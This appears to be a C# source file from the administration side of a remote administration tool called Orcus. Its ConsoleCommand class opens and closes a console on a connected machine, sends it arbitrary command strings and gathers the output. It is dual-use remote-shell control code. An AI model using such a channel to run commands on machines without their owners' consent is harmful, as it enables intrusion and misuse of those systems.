using System;
using Orcus.Shared.Commands.Console;
using System.Collections.Generic;
using System.Text;

namespace Orcus.Administration.App
{
	public class ConsoleCommand : Command
	{
		public event EventHandler Started;
		public event EventHandler Stopped;
		public event EventHandler<string> ConsoleLineReceived;

		public bool IsEnabled { get; set; }
		public StringBuilder CurrentOutput {
			get;
			private	set;
		}

		public override void ResponseReceived (byte[] parameter)
		{
			if (parameter == null || parameter.Length == 0)
				return;

			switch ((ConsoleCommunication) parameter[0])
			{
			case ConsoleCommunication.ResponseNewLine:
				var line = Encoding.UTF8.GetString (parameter, 1, parameter.Length - 1);
				CurrentOutput.AppendLine (line);
				ConsoleLineReceived?.Invoke (this, line);
				break;
			case ConsoleCommunication.ResponseConsoleOpen:
				IsEnabled = true;
				Started?.Invoke (this, EventArgs.Empty);
				break;
			case ConsoleCommunication.ResponseConsoleClosed:
				IsEnabled = false;
				Stopped?.Invoke (this, EventArgs.Empty);
				break;
			default:
				throw new ArgumentOutOfRangeException();
			}
		}

		public void Start()
		{
			if (IsEnabled)
				return;

			CurrentOutput = new StringBuilder ();
			ConnectionInfo.SendCommand(this, new[] {(byte) ConsoleCommunication.SendStart});
		}

		public void Stop()
		{
			if (!IsEnabled)
				return;

			ConnectionInfo.SendCommand(this, new[] {(byte) ConsoleCommunication.SendStop});
		}

		public void SendCommand(string command)
		{
			var package = new List<byte> {(byte) ConsoleCommunication.SendCommand};
			package.AddRange(Encoding.UTF8.GetBytes(command));
			ConnectionInfo.SendCommand(this, package.ToArray());
		}

		protected override uint GetId ()
		{
			return 5;
		}
	}
}